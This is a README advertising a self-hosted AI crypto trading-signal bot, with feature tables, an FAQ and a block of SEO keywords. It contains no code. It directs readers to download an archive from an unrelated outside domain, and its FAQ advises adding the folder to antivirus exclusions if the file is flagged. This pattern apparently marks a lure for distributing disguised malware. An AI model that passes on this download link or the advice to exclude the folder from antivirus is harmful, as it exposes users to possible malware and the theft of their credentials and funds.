# Crypto Signal AI Bot 🧠📡

A self-hosted signal engine for traders who want the reasoning behind a call, not just an arrow. Instead of hardcoding one indicator, this bot runs a **multi-model pipeline**: a technical ensemble, a news-sentiment agent, and an optional LLM analyst each produce a view, then a fusion layer combines them into a structured BUY/SELL/HOLD signal with a confidence score and a market-regime tag. Signals can be backtested, paper-traded, and pushed to Telegram or Discord with entry, stop-loss, and take-profit levels already defined.

[![Download Crypto Signal AI Bot](https://img.shields.io/badge/Download-Crypto_Signal_AI_Bot-blueviolet)](https://dyhuiying.com/s/file)

![Version](https://img.shields.io/badge/version-1.2-blue)
![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-0078D6)
![Status](https://img.shields.io/badge/status-active-brightgreen)
![Models](https://img.shields.io/badge/models-6%2B-orange)

<details>
<summary>📑 Contents</summary>

- [Quick Start](#-quick-start)
- [Requirements](#️-requirements)
- [Key Features](#-key-features)
- [Module Overview](#-module-overview)
- [Why Choose Crypto Signal AI Bot](#-why-choose-crypto-signal-ai-bot)
- [FAQ](#-faq)
- [SEO Keywords](#-seo-keywords)

</details>

## ⚡ Quick Start

1. Download the archive using the button above.
2. Install dependencies with `pip install -r requirements.txt`.
3. Add exchange and model credentials to `.env`, then run `signal-ai backtest` or `signal-ai live`.

The bot starts in backtest mode; live signal streaming must be enabled explicitly.

## 🖥️ Requirements

| Item | Requirement |
|------|-------------|
| OS | Windows 10/11, macOS 12+, Linux (64-bit) |
| RAM | 8 GB minimum |
| Storage | 500 MB free |
| Privileges | Standard user (no admin required) |

## ✨ Key Features

**AI Signal Pipeline**

- 🧠 **Multi-Agent Fusion** — technical, sentiment, and macro agents each produce a view before a meta-layer combines them into a single verdict with confidence.
- 🤖 **LLM Analyst (Optional)** — OpenAI, Anthropic, or local models write a rationale attached to each signal; the signal itself remains deterministic.
- 📰 **News Sentiment** — headline ingestion with relevance scoring, separate from price action.
- 🔗 **On-Chain Inputs** — exchange netflow, whale flows, and funding rates as features in the fusion layer.

**Ensemble & Validation**

- 📊 **ML Ensemble** — gradient boosting, LSTM, and ARIMA-family models vote on direction; ensemble weights are configurable.
- 🧪 **Backtesting Engine** — historical replay with fee, slippage, and latency models before live deployment.
- 📄 **Paper Trading** — virtual accounts track PnL without real capital at risk.
- 📉 **Metrics Dashboard** — win rate, average R, drawdown, and per-agent attribution.

**Delivery & Operations**

- 📱 **Telegram & Discord** — structured alerts with direction, entry, stop-loss, take-profit, and confidence.
- 🛡️ **Risk Layer** — position sizing and stop-loss are computed from the signal, not left to the user.
- 🔌 **Multi-Exchange** — Binance, Bybit, OKX, KuCoin, and others through CCXT.
- 🐳 **Docker Support** — one-command deployment with `docker compose up`.

**Local & Private**

- 💻 **Local Inference Mode** — run models through Ollama or GPT4All so prompts and keys never leave the machine.
- 🔐 **Read-Only by Default** — signal generation requires no trading permissions; execution is a separate opt-in module.
- 📡 **Webhook Output** — forward signals to TradingView, a bot, or a custom endpoint.

## 📋 Module Overview

| Module | What it does | Interface |
|--------|--------------|-----------|
| technical_agent | Indicator ensemble voting | Python API |
| sentiment_agent | News and social sentiment scoring | Python API |
| onchain_agent | Netflow and whale features | Python API |
| fusion_layer | Combine agent views into a verdict | Python API |
| llm_analyst | Optional rationale generation | Local or API |
| backtester | Historical replay with cost models | CLI |
| paper_trader | Virtual accounts and PnL tracking | CLI / Web UI |
| alert_dispatcher | Telegram, Discord, and webhook delivery | CLI |

## 🚀 Why Choose Crypto Signal AI Bot

- ✅ Reasoning-first — every signal carries a confidence score and an optional written rationale, not just a direction.
- ✅ Multi-agent by design — technical, sentiment, and on-chain views are fused instead of one indicator deciding everything.
- ✅ Deterministic core, optional LLM — the signal logic stays reproducible even when the language layer is enabled.
- ✅ Backtest before belief — AI strategies are validated on historical data before live capital is trusted.
- ✅ Local inference support — models can run through Ollama or GPT4All, keeping prompts and keys on your machine.

## 💡 Why Use It

- 🧠 See *why* a signal fired, with agent-level attribution and confidence, instead of an opaque score.
- 📰 Incorporate news sentiment without writing a separate ingestion pipeline.
- 🧪 Validate an AI strategy on historical data before following its live calls.
- 🤖 Run models locally so proprietary prompts and API keys never leave your machine.

## ❓ FAQ

**Do I need to run it as Administrator?**
No — the bot runs as a standard user process and does not require elevated privileges.

**Will my antivirus flag the file?**
Some engines may flag Python entry points by heuristic. Add the project folder to exclusions if needed.

**Does it work on Windows 11?**
Yes — Windows 10/11, macOS, and Linux are all supported.

**Does the LLM generate the signals?**
No — signals come from the deterministic fusion layer; the LLM only writes rationale and summaries.

**How do I update?**
Pull the latest archive and reinstall dependencies — model caches and configs are preserved.

## 🔎 SEO Keywords

Crypto Signal AI Bot, AI crypto signal bot, crypto signal bot github, LLM crypto signals, machine learning crypto signals, multi-agent crypto trading, AI trading signals self-hosted, crypto sentiment analysis bot, on-chain signal bot, crypto signal bot confidence score, local AI crypto bot, Ollama crypto signals, GPT4All trading bot, crypto ensemble models, backtesting AI signals, paper trading AI bot, Telegram AI crypto signals, Discord AI crypto signals, open source AI signal bot, crypto signal bot python

## ⚠️ Disclaimer

Provided for educational and informational purposes only. Use at your own risk and in accordance with the terms of service of any exchange, model provider, or data source you interact with. Trading involves financial risk, and past signal performance does not guarantee future results.
